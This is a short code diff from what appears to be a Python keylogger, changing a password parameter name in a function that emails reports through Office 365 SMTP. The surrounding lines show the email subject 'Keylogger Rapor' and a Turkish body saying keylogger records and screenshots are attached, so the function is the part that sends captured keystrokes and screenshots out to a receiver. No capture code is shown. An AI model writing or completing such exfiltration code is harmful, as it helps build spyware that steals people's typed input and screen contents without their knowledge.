@@ -22,7 +22,7 @@ subject = 'Keylogger Rapor'
 body = 'Keylogger kayıtları ve ekran görüntüleri ektedir.'
 attachments = []
 
-def send_outlook_email(sender_email, receiver_email, app_password, subject, body, attachments):
+def send_outlook_email(sender_email, receiver_email, email_password, subject, body, attachments):
     msg = MIMEMultipart()
     msg['From'] = sender_email
     msg['To'] = receiver_email
@@ -41,7 +41,7 @@ def send_outlook_email(sender_email, receiver_email, app_password, subject, body
     try:
         server = smtplib.SMTP('smtp.office365.com', 587)
         server.starttls()
-        server.login(sender_email, app_password)
+        server.login(sender_email, email_password)
         server.sendmail(sender_email, receiver_email, msg.as_string())
         server.quit()
         print("E-posta gönderildi!")
